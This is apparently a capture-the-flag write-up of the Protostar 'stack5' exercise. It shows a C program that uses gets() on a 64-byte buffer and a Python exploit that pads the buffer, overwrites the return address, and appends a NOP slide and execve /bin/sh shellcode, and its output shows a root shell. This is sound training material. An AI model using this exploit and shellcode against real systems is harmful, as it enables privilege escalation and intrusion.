# Stack5

## About
Stack5 is a standard buffer overflow, this time introducing shellcode.

Hints
- At this point in time, it might be easier to use someone elses shellcode
- If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
- remove the int3s once your shellcode is done.

## Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

---

Overflow `buffer[64]` and thus rewrite the rest of the stack frame, followed by stored `EBP` and,
finally, stored `ret` address with the memory address of our shell payload. To make
the exploit more stable, we use a [NOP slide](https://en.wikipedia.org/wiki/NOP_slide).

The stack pointer (`ESP`) address is not always the same. It depends on, for example,
the value of env variables such as `PWD` (`./stack5` vs. `/opt/protostar/bin/stack5`).
Therefore, using a NOP slide is desirable here.


```python
# stack5.py
padding = 'a'*76 # Explained in stack4
ret = '\xb0\xf7\xff\xbf' # Jump here, hopefully somewhere into NOPs
nop_slide = '\x90'*100
# http://shell-storm.org/shellcode/files/shellcode-811.php
shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
payload = padding + ret + nop_slide + shellcode
print payload
```

At last, execute
```shell script
(python stack5.py; cat ) | /opt/protostar/bin/stack5
id
# uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
whoami
# root
```

See [LiveOverflow's video](https://www.youtube.com/watch?v=HSlhY4Uy8SA) for detailed explanation.
